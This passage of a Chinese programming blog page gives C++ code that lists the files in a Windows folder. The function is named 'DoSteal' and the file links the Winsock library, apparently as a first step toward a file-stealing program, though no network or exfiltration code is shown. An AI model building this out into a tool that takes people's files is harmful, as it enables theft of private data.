+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	<span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">strcpy</span>(mypath, szPath);</span><br><span class="line">	<span class="built_in">strcat</span>(mypath, file_for_find.cFileName);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;mypath = %s\n&quot;</span>, mypath);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile, &amp;file_for_find));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="完整代码">完整代码</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//1 遍历路径下所有文件夹</span></span><br><span class="line">	WIN32_FIND_DATA file_for_find;			<span class="comment">//文件数据</span></span><br><span class="line">	HANDLE hListFile;						<span class="comment">//用句柄来标志文件</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> szFilePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">strcpy</span>(szFilePath, szPath);</span><br><span class="line">	<span class="built_in">strcat</span>(szFilePath, <span class="string">&quot;\\*&quot;</span>);</span><br><span class="line">	<span class="comment">//2 找到第一个文件</span></span><br><span class="line">	hListFile = <span class="built_in">FindFirstFile</span>(szFilePath, &amp;file_for_find);</span><br><span class="line">	<span class="comment">//3 循环遍历所有文件</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="built_in">strcpy</span>(mypath, szPath);</span><br><span class="line">		<span class="built_in">strcat</span>(mypath, file_for_find.cFileName);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;mypath = %s\n&quot;</span>, mypath);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile, &amp;file_for_find));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">DoSteal</span>(<span class="string">&quot;D:\\文件合集\\&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+</ul>
+
+  <section id="nav-wrapper">
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/18/">« prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><a class="page-number" href="/page/21/">21</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" href="/page/20/">next »</a>
+    </nav>
+  </section>
+
+
+            <footer>
+    <div>© 2023 - Yunyin </div>
+    <div>
+        <span>
+            Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+        </span>
+        ,
+        <span>
+            Theme - <a target="_blank" rel="noopener" href="https://github.com/nameoverflow/hexo-theme-icalm">Icalm</a>
+        </span>
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+
+<script src="/js/pager/dist/singlepager.js"></script>
+
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
